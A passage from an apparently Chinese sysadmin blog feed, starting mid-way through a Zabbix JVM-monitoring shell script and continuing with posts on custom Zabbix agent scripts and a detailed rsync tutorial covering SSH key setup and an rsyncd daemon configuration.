"%d\n", $13*1024&#125;' ;; CCSU) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $12*1024&#125;' ;; CCSMN) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $14*1024&#125;' ;; CCSMX) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $15*1024&#125;' ;; YGC) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $17&#125;' ;; YGCT) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%f\n", $8&#125;' ;; FGC) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $18&#125;' ;; FGCT) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%f\n", $10&#125;' ;; GCT) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%f\n", $11&#125;' ;; TT) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $5&#125;' ;; MTT) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $6&#125;' ;; Loaded) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $1&#125;' ;; Unloaded) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $3&#125;' ;; CPU) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%f\n", $1&#125;' ;; MEM) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $1*1024&#125;' ;; *) echo "Error input:" ;; esac exit 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这套脚本没什么讲的，就是重复的进行一些判断，抓数据并输出（注意，之前写的获取的jstat参数的值其实是不准确的，获取的值是以KB为单位而不是以字节为单位，所以我取完数据后对数据进行成字节为单位了。） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接下来，讲一下这几个脚本该怎么部署。我这里的zabbix_agentd是通过yum安装的，所以安装在/usr/local目录下，配置文件在/usr/local/etc目录下，需要在zabbix_agentd.conf里面添加下面两行获取数据的key（注意，添加好后一定要记得重启zabbix_agentd进程）： 12UserParameter=jmx.discovery,/usr/local/etc/scripts/get_jvmlist.shUserParameter=jmx.resource[*],/usr/local/etc/scripts/set_jvmstatus.sh $1 $2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后脚本都放置在/usr/local/etc/scripts/目录下，该目录下的脚本权限如下： 123456-rwxr-xr-x 1 zabbix zabbix 326 3月 26 22:29 get_jvmlist.sh -rwxr-xr-x 1 root root 2956 3月 28 20:57 get_jvmstatus.sh -rwxr-xr-x 1 root root 818 3月 26 22:33 jvm_list.sh drwxr-xr-x 2 zabbix zabbix 4096 3月 26 23:05 package -rw-r--r-- 1 zabbix zabbix 1947 3月 29 11:23 package_path.txt -rwxr-xr-x 1 zabbix zabbix 5240 3月 28 20:50 set_jvmstatus.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后需要在crontab里面定义jvm_list.sh和get_jvmstatus.sh脚本的定时任务，我这里定义的如下： 12* */1 * * * /usr/local/etc/scripts/jvm_list.sh*/5 * * * * /usr/local/etc/scripts/get_jvmstatus.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意这两个脚本必须要以root权限去执行，因为里面涉及到的一些命令只有root用户才有权限去执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后可以手动执行脚本去获取数据，看是否能够抓取到相应的数据。 四、zabbix获取数据&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过之前的脚本部署，可以在zabbix_server上面通过zabbix_get命令去检查是否获取到了相应的数据： 12zabbix_get -s xx.xx.xx.xx -k jmx.resource[Abcdefg-1.0.0-rc-bin.tar.gz,MEM] 641036288 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里可以获取到数据了(注意IP被注释掉了，为了保护隐私哈，包名也被刻意修改了) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接下来就可以部署模板了，至于模板已经做好了，可以直接在附件里面下载。至于模板我制作了一些简单的key的值收集，以及图像的展示，至于监控报警值的设置，由于各个公司的环境不一样，需要各位自己根据自己需求自行设置。]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zabbix自定义监控脚本配置]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F4.%20Zabbix%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%91%E6%8E%A7%E8%84%9A%E6%9C%AC%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Zabbix自定义监控脚本配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：要添加自定义脚本监控，必须升级zabbix agent版本至2.0.0以上，这里以2.0.8为例 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置方式： 完成自定义监控脚本的编写（windows或linux脚本） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本要求： 既然是监控，那必然要有输出结果值（字符串，数字皆可） 必须要求zabbix用户有执行权限，当然可以直接设置所有用户都有执行权限（chmod 777 脚本文件） 若脚本需要传入参数，按照参数传入的顺序，在脚本中可用$1-$9来引用传入的参数 找到zabbix agent的配置文件zabbix_agentd.conf,修改如下两个参数 12UnsafeUserParameters=0 =&gt; UnsafeUserParameters=1 #并去掉前面的注释符UserParameter= =&gt; UserParameter=aaa.bbb[*], /usr/local/script/monitor.sh $1 $2 ... &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：aaa.bbb[*] —zabbix服务器添加监控信息时需要用到的key值， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式：aaa.bbb* /usr/local/script/monitor.sh —-监控脚本绝对路径 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了便于灵活监控，有时脚本需要传入参数，此参数可从zabbix服务器端传入，所有参数按顺序分别从$1-$9表示 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注： 若无需传入参数，则红色部分可省略 该自定义脚本可由zabbix服务器控制收集数据的频率（如：每30s运行一次），无需再添加计划任务 以上参数请根据实际情况填写，并注意去除参数前注释符(#) 注意在key值和后面的脚本之间有个逗号隔开 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至此，自定义监控脚本zabbix agent端配置结束 测试 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试命令: 1/usr/local/bin/zabbix_agentd -t key[参数] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例： 1/usr/local/bin/zabbix_agentd -t system.file.size[/etc/a.txt,abc,...] 监控脚本举例： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本名称：/usr/local/script/monitor.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本内容：echo date +&quot;%F %T&quot; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本要求：必须在控制台输出值，该值将作为返回值返回给zabbix服务器端]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- rsync]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F85.%20Linux%20%E5%91%BD%E4%BB%A4-%20rsync%2F</url>
    <content type="text"><![CDATA[Linux 命令- rsync&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rsync从字面上的意思可以理解为remote sync （远程同步）这样可以理解的更深刻一些。Rsync不仅可以远程同步数据（类似于scp），当然还可以本地同步数据（类似于cp），但不同于cp或scp的一点是，rsync不像cp/scp一样会覆盖以前的数据（如果数据已经存在），它会先判断已经存在的数据和新数据有什么不同，只有不同时才会把不同的部分覆盖掉。如果Linux没有rsync命令使用yum安装 1yum install -y rsync 命令语法123456rsync [OPTION]... SRC DEST rsync [OPTION]... SRC [USER@]host:DEST rsync [OPTION]... [USER@]HOST:SRC DEST rsync [OPTION]... [USER@]HOST::SRC DEST rsync [OPTION]... SRC [USER@]HOST::DEST rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对应以上六种命令格式，rsync有六种不同的工作模式： 拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号 : 分隔符时就启动这种工作模式。 1rsync -a /data/backup 使用一个远程shell程序（如rsh、ssh）来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号 : 分隔符时启动该模式。 1rsync -avz *.c foo:src 使用一个远程shell程序（如rsh、ssh）来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号 : 分隔符时启动该模式。 1rsync -avz foo:src/bar /data 从远程rsync服务器中拷贝文件到本地。当SRC路径信息包含“::”分隔符时启动该模式。 1rsync -av root@192.168.78.192::www /databack 从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含“::”分隔符十启动该模式。 1rsync -av /databack root@192.168.78.192::www 列远程机的文件列表。类似于rsync传输，不过主要在命令中省略掉本机信息即可 1rsync -v rsync://192.168.78.192/www 命令参数 -v, –verbose 详细模式输出。 -q, –quiet 精简输出模式。 -c, –checksum 打开校验开关，强制对文件传输进行校验。 -a, –archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。 -r, –recursive 对子目录以递归模式处理。 -R, –relative 使用相对路径信息。 -b, –backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用–suffix选项来指定不同的备份文件前缀。 –backup-dir 将备份文件(如~filename)存放在在目录下。 -suffix=SUFFIX 定义备份文件前缀。 -u, –update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。 -l, –links 保留软链结。 -L, –copy-links 想对待常规文件一样处理软链结。 –copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。 –safe-links 忽略指向SRC路径目录树以外的链结。 -H, –hard-links 保留硬链结。 -p, –perms 保持文件权限。 -o, –owner 保持文件属主信息。 -g, –group 保持文件属组信息。 -D, –devices 保持设备文件信息。 -t, –times 保持文件时间信息。 -S, –sparse 对稀疏文件进行特殊处理以节省DST的空间。 -n, –dry-run现实哪些文件将被传输。 -w, –whole-file 拷贝文件，不进行增量检测。 -x, –one-file-system 不要跨越文件系统边界。 -B, –block-size=SIZE 检验算法使用的块尺寸，默认是700字节。 -e, –rsh=command 指定使用rsh、ssh方式进行数据同步。 –rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。 -C, –cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。 –existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。 –delete 删除那些DST中SRC没有的文件。 –delete-excluded 同样删除接收端那些被该选项指定排除的文件。 –delete-after 传输结束以后再删除。 –ignore-errors 及时出现IO错误也进行删除。 –max-delete=NUM 最多删除NUM个文件。 - -partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。 –force 强制删除目录，即使不为空。 –numeric-ids 不将数字的用户和组id匹配为用户名和组名。 –timeout=time ip超时时间，单位为秒。 -I, –ignore-times 不跳过那些有同样的时间和长度的文件。 –size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。 –modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。 -T –temp-dir=DIR 在DIR中创建临时文件。 –compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。 -P 等同于 –partial。 –progress 显示备份过程。 -z, –compress 对备份的文件在传输时进行压缩处理。 –exclude=PATTERN 指定排除不需要传输的文件模式。 –include=PATTERN 指定不排除而需要传输的文件模式。 –exclude-from=FILE 排除FILE中指定模式的文件。 –include-from=FILE 不排除FILE指定模式匹配的文件。 –version 打印版本信息。 –address 绑定到特定的地址。 –config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。 –port=PORT 指定其他的rsync服务端口。 –blocking-io 对远程shell使用阻塞IO。 -stats 给出某些文件的传输状态。 –progress 在传输时现实传输过程。 –log-format=formAT 指定日志文件格式。 –password-file=FILE 从FILE中得到密码。 –bwlimit=KBPS 限制I/O带宽，KBytes per second。 -h, –help 显示帮助信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常用选项：-a、-v、–delete、–exclude 使用实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;试验准备 12345678910111213[root@localhost ~]# mkdir rsync[root@localhost ~]# cd rsync[root@localhost rsync]# mkdir test1[root@localhost rsync]# cd test1[root@localhost test1]# touch 1 2 3[root@localhost test1]# ln -s /root/123.txt ./123.txt[root@localhost test1]# ls -l总用量 0-rw-r--r-- 1 root root 0 6月 10 12:58 1lrwxrwxrwx 1 root root 13 6月 10 12:59 123.txt -&gt; /root/123.txt-rw-r--r-- 1 root root 0 6月 10 12:58 2-rw-r--r-- 1 root root 0 6月 10 12:58 3[root@localhost test1]# cd .. 实例1：使用-a选项12345[root@localhost rsync]# rsync -a test1 test2[root@localhost rsync]# ls test2test1[root@localhost rsync]# ls test2/test1/1 123.txt 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里有一个问题，就是本来想把test1目录直接拷贝成test2目录，可结果rsync却新建了test2目录，然后把test1目录放到了test2目录中。为了避免这样的情况，可以这样做： 12345678[root@localhost rsync]# rm -rf test2[root@localhost rsync]# rsync -a test1/ test2/[root@localhost rsync]# ls -l test2/总用量 0-rw-r--r-- 1 root root 0 6月 10 12:58 1lrwxrwxrwx 1 root root 13 6月 10 12:59 123.txt -&gt; /root/123.txt-rw-r--r-- 1 root root 0 6月 10 12:58 2-rw-r--r-- 1 root root 0 6月 10 12:58 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加个斜杠就可以了，所以建议在使用rsync备份目录时要养成加斜杠的习惯。-a选项表示以递归方式传输文件，并保持所有属性，等同于-rlptgoD。-a选项后面可以跟一个 --no-OPTION 这个表示关闭 -rlptgoD中的某一个，例如，-a--no-l 等同于 -rptgoD。下面看一看-l选项的作用： 1234567891011[root@localhost rsync]# rsync -av --no-l test1/ test2/sending incremental file listcreated directory test2./1skipping non-regular file "123.txt"23sent 200 bytes received 72 bytes 544.00 bytes/sectotal size is 13 speedup is 0.05 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用-v选项看起来方便，上例跳过了非普通文件123.txt，其实123.txt是一个软连接文件，如果不使用-l选项则不理会软连接文件的。虽然加上-l选项会把软连接文件给拷贝过去，但是软连接的目标文件却没有拷贝过去。 实例2：使用-L选项1234567891011121314151617[root@localhost rsync]# rsync -avL test1/ test2/sending incremental file listcreated directory test2./1123.txt23sent 231 bytes received 91 bytes 644.00 bytes/sectotal size is 0 speedup is 0.00[root@localhost rsync]# ls -l test2/总用量 0-rw-r--r-- 1 root root 0 6月 10 12:58 1-rw-r--r-- 1 root root 0 6月 10 12:39 123.txt-rw-r--r-- 1 root root 0 6月 10 12:58 2-rw-r--r-- 1 root root 0 6月 10 12:58 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加上-L选项就可以把SRC中软连接的目标文件给拷贝到DST。 实例3：使用-u选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先查看一下test1/1和test2/1的创建时间（肯定是一样的），然后使用touch修改一下test2/1的创建时间（此时test2/1要比test1/1的创建时间晚了一些），如果不加-u选项的话，会把test2/1的创建时间编程和test1/1的创建时间一样。 123456789[root@localhost rsync]# ll test1/1 test2/1-rw-r--r-- 1 root root 0 6月 10 12:58 test1/1-rw-r--r-- 1 root root 0 6月 10 12:58 test2/1root@localhost rsync]# touch test2/1[root@localhost rsync]# ll test2/1-rw-r--r-- 1 root root 0 6月 10 13:20 test2/1[root@localhost rsync]# rsync -a test1/1 test2/[root@localhost rsync]# ll test2/1-rw-r--r-- 1 root root 0 6月 10 12:58 test2/1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加上-u选项后，不会再把test1/1同步为test2/1了。 1234567891011121314[root@localhost rsync]# touch test2/1[root@localhost rsync]# ll test2/1-rw-r--r-- 1 root root 0 6月 10 13:31 test2/1[root@localhost rsync]# rsync -avu test1/ test2/sending incremental file list./123.txt -&gt; /root/123.txtsent 100 bytes received 18 bytes 236.00 bytes/sectotal size is 13 speedup is 0.11[root@localhost rsync]# ll test2/1-rw-r--r-- 1 root root 0 6月 10 13:31 test2/1[root@localhost rsync]# ll test1/1-rw-r--r-- 1 root root 0 6月 10 12:58 test1/1 实例4：使用 –delete选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先删除test1/123.txt 123[root@localhost rsync]# rm -f test1/123.txt[root@localhost rsync]# ls test1/1 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后把test1/目录同步到test2/目录下 123456789[root@localhost rsync]# rsync -av test1/ test2/sending incremental file list./1sent 94 bytes received 34 bytes 256.00 bytes/sectotal size is 0 speedup is 0.00[root@localhost rsync]# ls test2/1 123.txt 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;test2/目录并没有删除掉123.txt，下面加上 --delete 选项： 12345678[root@localhost rsync]# rsync -av --delete test1/ test2/sending incremental file listdeleting 123.txtsent 52 bytes received 12 bytes 128.00 bytes/sectotal size is 0 speedup is 0.00[root@localhost rsync]# ls test2/1 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;test2/目录里的123.txt也被删除了，这就是 --delete 选项的用处。还有一种情况就是如果在DST增加了文件了，而SRC当中没有这些文件，同步时加上 --delete 选项后同样会删除新增的文件： 12345678910[root@localhost rsync]# touch test2/4[root@localhost rsync]# ls test1/1 2 3[root@localhost rsync]# ls test2/1 2 3 4[root@localhost rsync]# rsync -a --delete test1/ test2/[root@localhost rsync]# ls test1/1 2 3[root@localhost rsync]# ls test2/1 2 3 实例5：使用 –exclude选项123456[[root@localhost rsync]# touch test1/4[root@localhost rsync]# rsync -a --exclude="4" test1/ test2/[root@localhost rsync]# ls test1/1 2 3 4[root@localhost rsync]# ls test2/1 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外还可以使用匹配字符 * 12345678910111213[root@localhost rsync]# touch test1/1.txt test1/2.txt[root@localhost rsync]# ls test1/1 1.txt 2 2.txt 3 4[root@localhost rsync]# rsync -a --progress --exclude="*.txt" test1/ test2/sending incremental file list./40 100% 0.00kB/s 0:00:00 (xfer#1, to-check=0/5)sent 104 bytes received 34 bytes 276.00 bytes/sectotal size is 0 speedup is 0.00[root@localhost rsync]# ls test2/1 2 3 4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上例中，连带着使用了 --progress 选项，这个主要是用来观察rsync同步过程的状态的。简单总结一下，平时使用rsync同步数据的时候，使用-a选项基本上就可以达到想要的效果了，只是有时候会有个别的需求，会用到 -a --no-OPTION , -u , -L , --delete , --exclude 以及 --progress 这些选项。 实例6：ssh隧道方式1234567891011121314root@localhost rsync]# rsync -avL test1/ www@192.168.0.101:/tmp/test2/www@192.168.0.101's password:sending incremental file listcreated directory /tmp/test2./11.txt22.txt34sent 327 bytes received 129 bytes 182.40 bytes/sectotal size is 0 speedup is 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种方式是通过ssh拷贝数据，需要输入192.168.0.101那台机器www账户的密码。 1234567891011121314[root@localhost rsync]# rsync -avL www@192.168.0.101:/tmp/test2/ ./test3/www@192.168.0.101's password:receiving incremental file listcreated directory ./test3./11.txt22.txt34sent 128 bytes received 351 bytes 38.32 bytes/sectotal size is 0 speedup is 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上两种凡是如果写到脚背里，备份起来就有麻烦了，因为要输入密码，脚本本来就是自动的，不可能做到。但是不代表没有解决办法。那微是统计过密钥验证，密钥不设立密码就ok了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在操作以前先设置主机信息：192.168.0.10（主机名yanyi-1）和192.168.0.101（主机名yanyi），需要从yanyi-1拷贝数据到yanyi上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先确认一下yanyi-1上是否有这个文件 /root/.ssh/id_rsa.pub 12[root@yanyi-1 ~]# ssh-keygenGenerating public/private rsa key pair. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果Linux不存在这个文件，按如下方法生成： 123456789[root@yanyi-1 ~]# ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa):Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:3b:74:af:e8:08:ac:99:30:3f:ef:84:7a:a0:a6:3d:89 root@Aming-1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这个过程中会有一些交互的过程，它首先提示要输入这个密钥的密码，出于安全考虑应该定义个密码，但是目的就是为了自动化同步数据，所以这里不输入任何密码，直接按回车，即密码为空。最后则生成了私钥 /root/.ssh/id_rsa 和公钥文件 /root/.ssh/id_rsa.pub &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把公钥文件的内容拷贝到目标机器上： 12root@yanyi-1 ~]# cat .ssh/id_rsa.pubssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA5SPyJ/kliGTAMUan/GCN325VS8jMxvOn4uQoLU/NqBpCI3MrmvSucv6EAzxx1J2uOssW08el06LG+cUwXmm5mkqDRBV6C9qNnR/bVV5vr3QsUwbKPr7fdyJvruQWWR7cSL+mjP0SYmG2Qy2JcM3hl1IZArzC6yeUnq2Gwbax8LgbZE3XfRfOYdimwyh5Tfft7yLYipWc37k+oRUWkI3mW7PalsOlfQhxrLD/lS891y6RdSbGxMJWPoV0KMFbVh+uJgyAXpeuWl+F+/iuQPzb6w3h4pWI31bvbsE9BU82jSzHYEjpq3SN2MJN2vaLs5a0mVpm9zka/h4ITFB8Uy1iSQ== root@yanyi-1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制主机yanyi-1的 /root/.ssh/id_rsa.pub 文件内容，并粘贴到主机yanyi的 /home/www/.ssh/authorized_keys 中: 1[root@yanyi ~]# vim /home/www/.ssh/authorized_keys &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这一步也许会遇到/home/www/.ssh目录不存在的问题，可以手动创建，并修改目录权限为700，也可以执行 ssh-krygen 命令生成这个目录。保存/home/www/.ssh/authorized_keys文件后，再到主机yanyi-1上执行： 123[root@yanyi-1 ~]# ssh www@192.168.0.101Last login: Wed Jun 12 12:24:34 2013 from 192.168.0.10[www@yanyi ~]$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在不用输入密码也可以登录主机yanyi了。下面先用yanyi主机退出来，再从主机yanyi-1上执行rsync命令： 12345678910111213[root@yanyi-1 ~]# rsync -av rsync/test1/ www@192.168.0.101:/tmp/test4/sending incremental file listcreated directory /tmp/test4./11.txt22.txt34sent 327 bytes received 129 bytes 912.00 bytes/sectotal size is 0 speedup is 0.00 实例7：后台服务方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种方式可以理解成，在远程主机上建立一个rsync的服务器，在服务器上匹配好rsync的各种应用，然后本机作为rsync的一个客户端去连接远程的rsync服务器。 1、建立并配置rsync的配置文件 /etc/rsyncd.conf1234567891011121314151617[root@yanyi-1 ~]# vim /etc/rsyncd.conf#port=873log file=/var/log/rsync.logpid file=/var/run/rsyncd.pid#address=192.168.0.10[test]path=/root/rsyncuse chroot=truemax connections=4read only=nolist=trueuid=rootgid=rootauth users=testsecrets file=/etc/rsyncd.passwdhosts allow=192.168.0.101 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中配置文件分为两部分：全局置部分和模块配置部分。全局部分就是几个参数而已，就像rsyncd.conf中port、log file、pid file、address这些都属于全局配置。而 [test]以下部分就是模块配置部分了。一个配置文件中可以有多个模块，模块名自定义，格式就像rsyncd.conf中的这样。其实模块中的一些参数例如，use chroot、max connections、uid、gid、auth users、secrets file以及hosts allow都恶意可配置成全局的参数。当然给出的参数并不是所有的，可以通过 man rsyncd.conf 获得更多信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面简单解释一下这些参数的意义 ： port 指定在哪个端口启动rsyncd服务，默认是873 log file 指定日志文件 pid file 指定pid文件，这个文件的作用涉及到服务的启动以及停止等进程管理操作 address 指定启动rsyncd服务的IP，假如你的机器有多个IP，就可以指定其中一个启动rsyncd服务，默认是在全部IP上启动 [test] 指定模块名，自定义 path 指定数据存放的路径 use chroot true|false 默认是true，意思是在传输文件以前首先chroot到path参数所指 定的目录下。这样做的原因是实现额外的安全防护，但是缺点是需要以roots权限，并且不能备份指向外部的符号连接所指向的目录文件。默认情况下chroot值为true，如果数据当中有软连接文件的话建议设置成false。 max connections 指定最大的连接数，默认是0即没有限制 read only ture|false 如果为true则不能上传到该模块指定的路径下 list 指定当用户查询该服务器上的可用模块时，该模块是否被列出，设定为true则列出，false则隐藏 uid/gid 指定传输文件时，以哪个用户/组的身份传输 auth users 指定传输时要使用的用户名 secrets file 指定密码文件，该参数连同上面的参数如果不指定则不使用密码验证，注 意该密码文件的权限一定要是600 hosts allow 指定被允许连接该模块的主机，可以是IP或者网段，如果是多个，之间用空格隔开 2、编辑secrets file，保存后要赋予600权限，如果权限不对，不能完成同步123[root@yanyi-1 ~]# cat /etc/rsyncd.passwdtest:test123[root@yanyi-1 ~]# chmod 600 /etc/rsyncd.passwd 3、启动rsync服务1[root@yanyi-1 ~]# rsync --daemon --config=/etc/rsyncd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动后，可以查看一下日志，并查看端口是否启动： 1234[root@yanyi-1 ~]# cat /var/log/rsync.log[root@yanyi-1 ~]# netstat -lnp |grep 873tcp 0 0 0.0.0.0:873 0.0.0.0:* LISTEN 12066/rsynctcp 0 0 :::873 :::* LISTEN 12066/rsync &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想开机启动，把 rsync --daemon --config=/etc/rsyncd.conf 写入到 /etc/rc.d/rc.local 文件中。 4、到另一台机器上测试1234567891011121314[root@yanyi ~]# rsync -avL test@192.168.0.10::test/test1/ /tmp/test5/Password:receiving incremental file listcreated directory /tmp/test5./11.txt22.txt34sent 143 bytes received 354 bytes 994.00 bytes/sectotal size is 0 speedup is 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;刚提到有一个选项叫做 use chroot 默认为true，如果为true，同步的文件中有软连接，则会有问题。首先在主机yanyi-1的/root/rsync/test1/目录下创建一个软连接文件： 123[root@yanyi-1 ~]# ln -s /root/test.txt rsync/test1/test.txt[root@yanyi-1 ~]# ls -l rsync/test1/test.txtlrwxrwxrwx 1 root root 14 6月 12 13:24 rsync/test1/test.txt -&gt; /root/test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后再到主机yanyi上同步： 1234567891011121314151617[root@yanyi ~]# rsync -avL test@192.168.0.10::test/test1/ /tmp/test6/Password:receiving incremental file listsymlink has no referent: "/test1/test.txt" (in test)created directory /tmp/test6./11.txt22.txt34sent 143 bytes received 419 bytes 1124.00 bytes/sectotal size is 0 speedup is 0.00rsync error: some files/attrs were not transferred (see previous errors) (code23) at main.c(1532) [generator=3.0.6] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到，如果设置 use chroot 为true则同步软连接文件会有问题，把主机yanyi-1的rsync配置文件修改一下，把true改为false： 123[root@yanyi-1 ~]# sed -i 's/use chroot=true/use chroot=false/' /etc/rsyncd.conf[root@yanyi-1 ~]# grep 'use chroot' /etc/rsyncd.confuse chroot=false &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后再到主机yanyi上再次执行同步： 123456789101112131415[root@yanyi ~]# rsync -avL test@192.168.0.10::test/test1/ /tmp/test7/Password:receiving incremental file listcreated directory /tmp/test7./11.txt22.txt34test.txtsent 162 bytes received 410 bytes 1144.00 bytes/sectotal size is 0 speedup is 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就没有任何问题了。为什么修改完rsyncd.conf配置文件后，没有重启rsyncd服务？其实这是rsync的一个特定机制，配置文件即实时生效的，不用重启服务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的例子中，都有输入密码，这样同样不能写入脚本中自动执行，其实这种方式也是可以不用手动输入密码的，有两种实现方式： 1、指定密码文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在客户端上，也就是主机yanyi上，编辑一个密码文件： 1[root@yanyi ~]# vim /etc/pass &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入test用户的密码： 12[root@yanyi ~]# cat /etc/passtest123 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改密码文件的权限： 1[root@yanyi ~]# chmod 600 /etc/pass &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在同步的时候，指定一下密码文件，就可以省去输入密码的步骤了： 1234567891011121314[root@yanyi ~]# rsync -avL test@192.168.0.10::test/test1/ /tmp/test8/ --password-file=/etc/passreceiving incremental file listcreated directory /tmp/test8./11.txt22.txt34test.txtsent 190 bytes received 451 bytes 1282.00 bytes/sectotal size is 0 speedup is 0.00 